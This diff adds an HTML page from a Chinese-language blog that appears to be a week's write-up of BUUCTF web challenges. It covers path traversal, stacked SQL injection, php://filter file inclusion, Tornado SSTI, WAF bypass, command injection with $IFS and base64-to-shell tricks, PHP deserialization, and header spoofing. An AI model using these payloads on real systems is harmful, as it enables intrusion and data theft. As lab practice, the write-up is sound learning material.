@@ -1,0 +1,895 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="description" content="Nor pleased by external gain, nor sadden by personal losses" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+     jin91uo&#39;blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      
+<section class="cover">
+    
+  <div class="cover-frame">
+    <div class="bg-box">
+      <img src="/images/cover1.jpg" alt="image frame" />
+    </div>
+    <div class="cover-inner text-center text-white">
+      <h1><a href="/">jin91uo&#39;blog</a></h1>
+      <div id="subtitle-box">
+        
+        <span id="subtitle"></span>
+        
+      </div>
+      <div>
+        
+      </div>
+    </div>
+  </div>
+  <div class="cover-learn-more">
+    <a href="javascript:void(0)" class="anchor"><i class="ri-arrow-down-line"></i></a>
+  </div>
+</section>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>
+
+
+<!-- Subtitle -->
+
+  <script>
+    try {
+      var typed = new Typed("#subtitle", {
+        strings: ['面朝大海，春暖花开', '愿你一生努力，一生被爱', '想要的都拥有，得不到的都释怀'],
+        startDelay: 0,
+        typeSpeed: 200,
+        loop: true,
+        backSpeed: 100,
+        showCursor: true
+      });
+    } catch (err) {
+      console.log(err)
+    }
+  </script>
+  
+<div id="main">
+  <section class="outer">
+  
+  
+  
+
+<div class="notice" style="margin-top:50px">
+    <i class="ri-heart-fill"></i>
+    <div class="notice-content" id="broad"></div>
+</div>
+<script type="text/javascript">
+    fetch('https://v1.hitokoto.cn')
+        .then(response => response.json())
+        .then(data => {
+            document.getElementById("broad").innerHTML = data.hitokoto;
+        })
+        .catch(console.error)
+</script>
+
+<style>
+    .notice {
+        padding: 20px;
+        border: 1px dashed #e6e6e6;
+        color: #969696;
+        position: relative;
+        display: inline-block;
+        width: 100%;
+        background: #fbfbfb50;
+        border-radius: 10px;
+    }
+
+    .notice i {
+        float: left;
+        color: #999;
+        font-size: 16px;
+        padding-right: 10px;
+        vertical-align: middle;
+        margin-top: -2px;
+    }
+
+    .notice-content {
+        display: initial;
+        vertical-align: middle;
+    }
+</style>
+  
+  <article class="articles">
+    
+    
+    
+    
+    <article
+  id="post-Buu-Week-1"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2020/10/10/Buu-Week-1/"
+    >Buu-Week-1</a> 
+</h2>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/10/10/Buu-Week-1/" class="article-date">
+  <time datetime="2020-10-10T13:53:41.000Z" itemprop="datePublished">2020-10-10</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Buu/">Buu</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="刷题记录-Week-1"><a href="#刷题记录-Week-1" class="headerlink" title="刷题记录_Week_1"></a>刷题记录_Week_1</h1><hr>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="0x01-Warmup-php代码审计"><a href="#0x01-Warmup-php代码审计" class="headerlink" title="0x01 Warmup  [php代码审计]"></a>0x01 Warmup  [php代码审计]</h3><p>打开链接一个滑稽图片，查看网页源码，指示source.php，去看看，是PHP代码审计，代码如下：</p>
+<p><img src="/2020/10/10/Buu-Week-1/1.png"></p>
+<ul>
+<li><p>有一个emmm类，里面就一个成员方法checkFile($page)，类后面有一个判断：获取变量file，要求file<code>不为空</code>且<code>是字符串</code>且<code>满足emmm::checkFile</code>，如此则包含file变量中的文件，否则输出滑稽图。</p>
+<blockquote>
+<p>empty($s)：判断变量是否为空。若$s存在，则返回flase，否则返回ture。</p>
+</blockquote>
+</li>
+<li><p>有个hint.php，访问看看，有个提示：<code>flag not here, and flag in ffffllllaaaagggg</code>，那么我们的构造的payload里面file应该要在这个文件夹里。</p>
+</li>
+<li><p>前面两个条件很好满足，现在看看checkFile()函数里面有啥东西吧：首先有一个白名单，对传进来的参数$page，如果为空或者不是字符串，不满足条件返回false；若$page参数在白名单里面，返回True；返回$page从开始到<code>？</code>的字符串赋值给$_page；$_page参数在白名单里面，返回True；把$page<code>urldecode</code>一下赋值给$_page，返回$_page从开始到<code>？</code>的字符串给$_page；$_page参数在白名单里面，返回True；如果都不行，返回false。</p>
+<blockquote>
+<p>mb_substr($str, $start, [$length, $encoding])：返回字符串的一部分</p>
+<p>mb_subpos($str, $sub_str)：返回被查找的字符串在别一字符串中首次出现的位置</p>
+</blockquote>
+</li>
+<li><p>怎么构造payload使其满足checkFile()呢？首先，我们要知道服务器端在接受传参的时候解码一次，那么我们可以把?编码两次，然后在服务器端解码的时候，checkFile()中的urldecode函数再解码一次，就变成？，前面变成白名单的文件名就行，后面的变成file的值，尝试不同目录下是否有ffffllllaaaagggg。</p>
+</li>
+</ul>
+<p>payload为：<code>?page=source.php%253f../../../../../253ffffllllaaaagggg</code></p>
+<hr>
+<h3 id="0x02-随便注-sql注入"><a href="#0x02-随便注-sql注入" class="headerlink" title="0x02 随便注 [sql注入]"></a>0x02 随便注 [sql注入]</h3><p>打开靶场，如下</p>
+<p><img src="/2020/10/10/Buu-Week-1/2.png"></p>
+<p>第一步，看看是用啥闭合的。用<code>1&#39; and 1=2</code>报错，说明使用单引号闭合。</p>
+<p>第二步，order by爆字段。尝试到<code>order by 3</code>时报错，说明是两个字段。</p>
+<p><img src="/2020/10/10/Buu-Week-1/3.png"></p>
+<p>第三步，尝试爆库名，<code>1&#39; and 1=2 union select database()-- 123</code>，结果大小写都被过滤了：</p>
+<p><img src="/2020/10/10/Buu-Week-1/4.png"></p>
+<p>第四步，常用的sql关键字都没了，试试别的方法吧，堆叠注入<code>1;show tables;-- 123</code>：</p>
+<p><img src="/2020/10/10/Buu-Week-1/5.png"></p>
+<blockquote>
+<p>所谓堆叠注入，就是一次性执行多条sql语句</p>
+</blockquote>
+<p>有两张表，分别看看表的结构吧<code>1&#39;;show columns from 1919810931114514;-- 123</code>（注意这里又有一个考点，表名为数字时需要在表名前加反引号`` ` ）</p>
+<p><img src="/2020/10/10/Buu-Week-1/6.png"></p>
+<p>居然有个flag字段，然后有个空字段，看来要的东西就在里面；</p>
+<p>再看看words表<code>1&#39;;show columns from words;-- 123</code></p>
+<p><img src="/2020/10/10/Buu-Week-1/7.png"></p>
+<p>看来上面输出的信息就是来自于这个表。</p>
+<p>那么问题来了，如何才能在过滤掉这么多用法的情况下访问到flag字段呢？：</p>
+<ul>
+<li>方法一：注意到没过滤alter和rename，尝试修改表名，先吧words改成别的名，让19….表成为words表，字段也改一下。</li>
+</ul>
+<p>payload为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;test&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;;alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; int(10);-- 123</span><br><span class="line"># ALTER TABLE tiger (表名) CHANGE tigername(要修改的列) name (修改后的列名) VARCHAR(20)(类型);</span><br></pre></td></tr></table></figure>
+
+<p>改完之后用<code>1&#39; or 1=1 -- 123</code>看结果</p>
+<ul>
+<li><p>方法二：预处理。在mysql里我们可以通过设置变量，然后通过语法来串联字符串进行sql查询。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SET;									# 用于设置变量名和值</span><br><span class="line">PREPARE stmt_name FROM preparable_stmt;	# 用于预备一个语句，并赋予名称，以后可以引用该语句</span><br><span class="line">EXECUTE stmt_name;			 			# 执行语句</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;	# 用来释放掉预处理的语句</span><br></pre></td></tr></table></figure>
+
+<p>payload为：</p>
+<blockquote>
+<p>1’; Set @sql=CONCAT(‘se’,’lect * from `1919810931114514`;’); Prepare stmt from @sql; execute stmt;– 123</p>
+</blockquote>
+</li>
+</ul>
+<hr>
+<h3 id="0x03-SUCTF-Easy-Sql-sql注入"><a href="#0x03-SUCTF-Easy-Sql-sql注入" class="headerlink" title="0x03 SUCTF Easy_Sql [sql注入]"></a>0x03 SUCTF Easy_Sql [sql注入]</h3><p>打开靶场如图：</p>
+<p><img src="/2020/10/10/Buu-Week-1/8.png"></p>
+<p>这题太阴间了，出题人的角度刁钻，不按常规思路来，需要我们猜一下后台源码。</p>
+<p>输入非0数字都有一个回显，返回一个含有一个元素的数组；输入别的要么没回显，要么Nonono。看别人的题解是，猜源码是<code>select query||flag from Flag</code>，关键在于<code>||</code>，这使得语句变得无法正常输出flag。</p>
+<p>如果猜到这个源码，那么就有两种做法</p>
+<ol>
+<li><p><code>*, 1</code>:相当于<code>select *,1||flag from Flag</code>，即输出Flag表的内容，在输出一个1.</p>
+<p><img src="/2020/10/10/Buu-Week-1/9.png"></p>
+</li>
+<li><p>官方回答：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>堆叠注入，把<code>||</code>的意义变成字符串连接符，跟<code>，</code>差不多。</p>
+<p><img src="/2020/10/10/Buu-Week-1/10.png"></p>
+</li>
+</ol>
+<hr>
+<h3 id="0x04-secret-file-抓包-文件包含"><a href="#0x04-secret-file-抓包-文件包含" class="headerlink" title="0x04 secret_file  [抓包+文件包含]"></a>0x04 secret_file  [抓包+文件包含]</h3><p>打开站点，一个全黑页面，看源码，有一个提示：</p>
+<p><img src="/2020/10/10/Buu-Week-1/11.png"></p>
+<p>访问./Archive_room.php，是这个：</p>
+<p><img src="/2020/10/10/Buu-Week-1/12.png"></p>
+<p>点红色按钮：</p>
+<p><img src="/2020/10/10/Buu-Week-1/13.png"></p>
+<p>看来要抓包：</p>
+<p><img src="/2020/10/10/Buu-Week-1/14.png"></p>
+<p>访问secr3t.php：</p>
+<p><img src="/2020/10/10/Buu-Week-1/15.png"></p>
+<p>单独访问flag.php，没啥用，代码审计吧：</p>
+<blockquote>
+<p>strstr()：搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE（区分大小写）</p>
+<p>stristr()：和上面函数差不多，区别是不区分大小写</p>
+</blockquote>
+<p>文件包含漏洞，没有过滤file，利用php的file伪协议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2020/10/10/Buu-Week-1/16.png"></p>
+<p>base64解密一下，得网页信息：</p>
+<p><img src="/2020/10/10/Buu-Week-1/17.png"></p>
+<hr>
+<h3 id="0x05-easy-tornado-服务器模板注入攻击"><a href="#0x05-easy-tornado-服务器模板注入攻击" class="headerlink" title="0x05 easy_tornado  [服务器模板注入攻击]"></a>0x05 easy_tornado  [服务器模板注入攻击]</h3><p>打开链接，如下：</p>
+<p><img src="/2020/10/10/Buu-Week-1/18.png"></p>
+<p>flag.txt: <code>flag in /fllllllllllllag</code></p>
+<p>Welcome.txt: <code>render</code></p>
+<p>hints.txt: <code>md5(cookie_secret+md5(filename))</code></p>
+<p>首先要知道tornado是python下一款轻量级的web框架。</p>
+<p>对于第二个文件，render是python的一个渲染函数，让我们来学习一下：</p>
+<blockquote>
+<p>render方法实质是生成template（模板）；</p>
+<p>有三个参数：标签名、标签相关属性、标签内部的html内容</p>
+</blockquote>
+<p>根据提示，filename我们已经知道了，那么就要获取cookie_secret参数。</p>
+<p>目录扫描，有<code>error?msg=</code>，考虑服务器模板注入攻击<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/83999.html">SSTI</a></p>
+<blockquote>
+<p>SSTI攻击原理：服务端Web应用使用模板引擎渲染用户请求的过程。</p>
+<p>render函数在接受用户的输入时，把用户的输入直接输出，造成漏洞。</p>
+</blockquote>
+<p>先测试是否有SSTI，<code>msg=&#123;&#123;datatime&#125;&#125;</code></p>
+<p><img src="/2020/10/10/Buu-Week-1/19.png"></p>
+<p>存在！查文档找找<code>cookie_secret</code>在哪？</p>
+<p><img src="/2020/10/10/Buu-Week-1/20.png"></p>
+<p>别名：</p>
+<p><img src="/2020/10/10/Buu-Week-1/21.png"></p>
+<p>handler指向的处理当前这个页面的RequestHandler对象，<br>RequestHandler.settings指向self.application.settings，<br>因此handler.settings指向RequestHandler.application.settings。</p>
+<p>payload为：<code>msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
+<p><img src="/2020/10/10/Buu-Week-1/22.png"></p>
+<p>写脚本：</p>
+<p><img src="/2020/10/10/Buu-Week-1/23.png"></p>
+<p>最终payload为：<code>filename=/fllllllllllllag&amp;filehash=d3d1a3a19a5e5445b949305bbbc4e714</code></p>
+<p><img src="/2020/10/10/Buu-Week-1/24.png"></p>
+<p>注：写脚本踩过的坑：</p>
+<blockquote>
+<ol>
+<li>直接from hashlib import md5，用md5()是不行的，需要重写md5函数，用update()把字符串编码之后才可使用,hexdigest()返回摘要，作为二进制数据字符串值.</li>
+</ol>
+</blockquote>
+<hr>
+<h3 id="0x06-Include-1-文件包含"><a href="#0x06-Include-1-文件包含" class="headerlink" title="0x06 Include 1  [文件包含]"></a>0x06 Include 1  [文件包含]</h3><p>打开链接，是Tips文件夹，访问进去是：</p>
+<p><img src="/2020/10/10/Buu-Week-1/25.png"></p>
+<p>注意到有传参<code>file</code>，根绝题目可知应该是文件包含漏洞，尝试php的file伪协议</p>
+<p><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<p>得到base64加密串，解密即可：</p>
+<p><img src="/2020/10/10/Buu-Week-1/26.png"></p>
+<hr>
+<h3 id="0x07-easy-calc-waf与正则绕过"><a href="#0x07-easy-calc-waf与正则绕过" class="headerlink" title="0x07 easy_calc [waf与正则绕过]"></a>0x07 easy_calc [waf与正则绕过]</h3><h5 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h5><ul>
+<li>PHP的字符串解析特性：PHP会讲GET或者POST请求转化为关联数组，所以它在处理字符串查询语句时做了两件事：</li>
+</ul>
+<blockquote>
+<ol>
+<li>删除空白符</li>
+<li>将某些字符转化为下划线甚至删除</li>
+</ol>
+</blockquote>
+<ul>
+<li>何为waf？waf是我们看不见的，我一直错以为waf就是题里面的源码，其实是一种安全策略</li>
+<li>scandir()：返回传参目录下的目录与文件</li>
+</ul>
+<p>打开链接看题，查看源码，说这个计算器前端设置了waf来保证安全，后端代码在指向calc.php这个文件，看看：</p>
+<p><img src="/2020/10/10/Buu-Week-1/27.png"></p>
+<p>发现num过滤了很多符号，我们先把试试num传参，发现不能传入字母与“+”，否则就报错。正则里面没有过滤掉这两样，说明是waf在弄鬼，我们可以在<code>num</code>前加个空格，那么php解析仍然是num，但是waf却不认为它是num。使用scandir()查看<code>/</code>根目录下有啥文件，但是发现根目录符号也被过滤，考虑使用chr(47)绕过。构建payload:</p>
+<p><code>? num=1;var_dump(scandir(chr(47)))</code></p>
+<p><img src="/2020/10/10/Buu-Week-1/28.png"></p>
+<p>有个f1agg文件，用file_get_content()函数去获取内容，参数也用chr()构建，payload:</p>
+<p><code>? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
+<p><img src="/2020/10/10/Buu-Week-1/29.png"></p>
+<hr>
+<h3 id="0x08-ping-ping-ping-命令执行"><a href="#0x08-ping-ping-ping-命令执行" class="headerlink" title="0x08 ping ping ping [命令执行]"></a>0x08 ping ping ping [命令执行]</h3><h5 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h5><ul>
+<li><p>linux命令执行：加上管道符<code>|</code>或者分号<code>;</code></p>
+</li>
+<li><p>linux命令执行常见姿势：</p>
+<blockquote>
+<p>空格被ban：$IFS、${IFS}、$IFS$1、&lt;、&lt;&gt;、,、%20、%09</p>
+<p>利用<em>任意匹配：cat fl\</em></p>
+<p>利用：ca\t fl\ag.php</p>
+<p>利用：cat fl’’ag.php</p>
+<p>echo “Y2F0IGZsYWcucGhw”| base64 -d | bash</p>
+</blockquote>
+</li>
+</ul>
+<p>做题：</p>
+<p><img src="/2020/10/10/Buu-Week-1/30.png"></p>
+<p>读flag.php，失败：</p>
+<p><img src="/2020/10/10/Buu-Week-1/31.png"></p>
+<p>空格被搬ban，$IFS可用，flag被ban:</p>
+<p><img src="/2020/10/10/Buu-Week-1/32.png"></p>
+<p>看看index.php:</p>
+<p><img src="/2020/10/10/Buu-Week-1/33.png"></p>
+<p>过滤了很多符号、空格、bash、flag的贪婪匹配</p>
+<p>法一：变量拼接：</p>
+<p><code>?ip=127.0.0.1|a=g;cat$IFS$1fla$a.php</code></p>
+<p>法二：禁用bash，还有sh：</p>
+<p><code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code></p>
+<p>法三：内联执行：</p>
+<blockquote>
+<p>/?ip=127.0.0.1;cat$IFS$9`l\s`</p>
+</blockquote>
+<hr>
+<h3 id="0x09-极客大挑战-2019-PHP-文件泄漏-反序列化"><a href="#0x09-极客大挑战-2019-PHP-文件泄漏-反序列化" class="headerlink" title="0x09 极客大挑战 2019 PHP [文件泄漏+反序列化]"></a>0x09 极客大挑战 2019 PHP [文件泄漏+反序列化]</h3><p>点进链接是一个很好看的前端页面，扫一下目录吧，有个<code>www.zip</code></p>
+<p><img src="/2020/10/10/Buu-Week-1/34.png"></p>
+<p>下载之后的文件有：</p>
+<blockquote>
+<p>class.php</p>
+<p>Flag.php</p>
+<p>Index.js</p>
+<p>Index.php</p>
+<p>Style.css</p>
+</blockquote>
+<p>看看flag.php，显然不是flag.</p>
+<p>注意到了class.php和index.php，有反序列化的痕迹：</p>
+<p><img src="/2020/10/10/Buu-Week-1/35.png"></p>
+<p><img src="/2020/10/10/Buu-Week-1/36.png"></p>
+<p>托本地构建pop链：</p>
+<p><img src="/2020/10/10/Buu-Week-1/37.png"></p>
+<p>输出：</p>
+<p><img src="/2020/10/10/Buu-Week-1/38.png"></p>
+<p>为了绕过__wakeup方法，需要把属性数调大一点，然后补上protected和privete变量之前的<code>%00</code>，payload如下：</p>
+<p><code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p>
+<p>即可得到flag.</p>
+<hr>
+<h3 id="0x10-极客大挑战-2019Http-http-python-request"><a href="#0x10-极客大挑战-2019Http-http-python-request" class="headerlink" title="0x10 极客大挑战 2019Http [http python.request]"></a>0x10 极客大挑战 2019Http [http python.request]</h3><p>打开链接，啥也不是，查看源代码，（看了别人的题解才发现的，还是不够细心，我是five）</p>
+<p><img src="/2020/10/10/Buu-Week-1/39.png"></p>
+<p>进入是这么个页面：</p>
+<p><img src="/2020/10/10/Buu-Week-1/40.png"></p>
+<p>说这个链接不是来自于<code>https://www.Sycsecret.com</code></p>
+<p>根据http的姿势，看来是要我们伪造<code>header</code></p>
+<p>这极客大挑战简直恐怖，全是知识盲点，学习一波：</p>
+<h5 id="学习知识点："><a href="#学习知识点：" class="headerlink" title="学习知识点："></a>学习知识点：</h5><blockquote>
+<p>http协议：超文本传输协议，它允许将html文档从web服务器传到客户端的浏览器，目前的版本是HTTP/1.1 版本</p>
+<p>http协议是无状态的：这意味着同一个客户端发起的两次请求，在服务器端是没有联系的，为解决这一问题，web应用程序引入cookie机制以维持状态</p>
+<p>http消息的结构：</p>
+<p>​    request消息的结构：</p>
+<p><img src="/2020/10/10/Buu-Week-1/41.png"></p>
+<p>​        第一部分是Request line：</p>
+<p>​            method: 表示请求方法，比如GET或者Post</p>
+<p>​            path-to-source：表示要请求的资源路径</p>
+<p>​            version-number: HTTP协议的版本号</p>
+<p>​        第二部分是Request header：</p>
+<p>​            请求头（以下只列出经常使用的）</p>
+<p>​            Cache头域</p>
+<p>​                <code>pragma：no-cache</code>, 防止页面被缓存，与<code>cache-control: no-cache</code>作用一致</p>
+<p>​                <code>cache-control</code>: 规定缓存规则，HTTP/1.1加入的</p>
+<p>​                        public：任何cache都可缓存</p>
+<p>​                        private：只有私有cache可以缓存</p>
+<p>​                        no-cache：不可被缓存</p>
+<p>​            Client头域</p>
+<p>​                <code>Accept</code>：向HTTP服务器表明浏览器可接受的媒体类型，比如<code>Accept: text/html</code>表示浏览器接受服务器·                            返回的html文档</p>
+<p>​                <code>Accept-Encoding</code>：向HTTP服务器表明浏览器可接受的编码方式</p>
+<p>​                <code>Accept-Language</code>：向HTTP服务器表明浏览器可接受的语言</p>
+<p>​                <code>User-Agent</code>：向HTTP服务器表明客户端使用的操作系统和浏览器的名称和版本</p>
+<p>​                <code>Accept-Charset</code>：向HTTP服务器表明浏览器可接受的字符集</p>
+<p>​            Cookie/Login头域</p>
+<p>​                <code>Cookie</code>：把客户端的cookie值告诉给服务器</p>
+<p>​            Entity头域</p>
+<p>​                <code>Content-Length</code>：发送给HTTP服务器数据的长度。</p>
+<p>​            Miscellaneous 头域</p>
+<p>​                <code>Referer</code>：告诉服务器我是从哪个链接过来的</p>
+<p>​            Transport 头域</p>
+<p>​                <code>Host</code>：请求报头域主要用于指定被请求资源的Internet主机和端口号</p>
+<p>​        第三部分是Body</p>
+<p>​            当使用GET请求方法时，Body为空</p>
+<p>​    response消息的结构：</p>
+<p><img src="/2020/10/10/Buu-Week-1/42.png"></p>
+<p>​        第一部分是Response line：</p>
+<p>​            http/version-number：http版本号</p>
+<p>​            status code：状态码</p>
+<p>​                1xx：提示信息，请求成功接受，继续处理</p>
+<p>​                2xx：成功</p>
+<p>​                3xx：重定向</p>
+<p>​                4xx：客户端错误，请求有语法错误或者无法实现</p>
+<p>​                5xx：服务器端错误，服务器无法实现合理请求</p>
+<p>​            message：    </p>
+<p>​                状态吗消息</p>
+<p>​        第二部分是Response header：</p>
+<p>​            响应头</p>
+<p>​        第三部分是Body</p>
+</blockquote>
+<p>那么此题，我们需要伪造我们http协议的request消息是来自上述url的，我们使用python的requests模块。</p>
+<p>再学习一波这个模块的相关用法吧：</p>
+<blockquote>
+<ul>
+<li><p>r = request.get(“url”, param=param  , headers=headers)：以get方法请求资源，返回响应包给r</p>
+<p>param：接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()</p>
+<p>headers: 接受一个字典表明header请求头信息</p>
+<p>r.text：查看相应内容，返回的是Unicode格式的数据</p>
+<p>r.content：查看相应内容，返回的字节流数据</p>
+<p>r.url：查看完整url地址</p>
+<p>r.encoding：查看响应头部字符编码</p>
+<p>r.status_code：查看响应码</p>
+<p>r.cookies：查看cookie</p>
+</li>
+<li><p>request.post(“url”, data = formdata, headers = headers)</p>
+</li>
+<li><p>session对象：代表一次用户会话，即从客户端浏览器连接服务器开始，到客户端浏览器与服务器断开。</p>
+</li>
+</ul>
+</blockquote>
+<p>那么现在开始写一个伪造http小脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;https://www.Sycsecret.com&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://1128-5ff83ac1-22a6-435c-ba67-3bb780dfba65node3.buuoj.cn:25551/Secret.php&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url, headers = headers)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>用jupyter看看响应包，发现在body部分有：</p>
+<p><img src="/2020/10/10/Buu-Week-1/43.png"></p>
+<p>需要在headers中伪造<code>User-Agent</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers &#x3D; &#123;&quot;Referer&quot;:&quot;https:&#x2F;&#x2F;www.Sycsecret.com&quot;, &quot;User-Agent&quot;:&quot;Syclover&quot;&#125;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;1128-5ff83ac1-22a6-435c-ba67-3bb780dfba65node3.buuoj.cn:25551&#x2F;Secret.php&quot;</span><br><span class="line"></span><br><span class="line">response &#x3D; requests.get(url, headers &#x3D; headers)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<p><code>No!!! you can only read this locally!!!</code></p>
+<p>考察XFF，在headers中再加入<code>X-Forward-For</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers &#x3D; &#123;&quot;Referer&quot;:&quot;https:&#x2F;&#x2F;www.Sycsecret.com&quot;, &quot;User-Agent&quot;:&quot;Syclover&quot;, &quot;X-Forward-For&quot;:&quot;127.0.0.1&quot;&#125;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;1128-5ff83ac1-22a6-435c-ba67-3bb780dfba65node3.buuoj.cn:25551&#x2F;Secret.php&quot;</span><br><span class="line"></span><br><span class="line">response &#x3D; requests.get(url, headers &#x3D; headers)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<p><img src="/2020/10/10/Buu-Week-1/44.png"></p>
+<p>Over!</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Buu/" rel="tag">Buu</a></li></ul>
+
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+  </article>
+  
+
+  
+</section>
+</div>
+
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2015-2021
+        <i class="ri-heart-fill heart_icon"></i> jin91uo
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        Powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="division">|</span>
+        Theme - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="jin91uo&#39;blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags/%E6%97%85%E8%A1%8C/">旅行</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
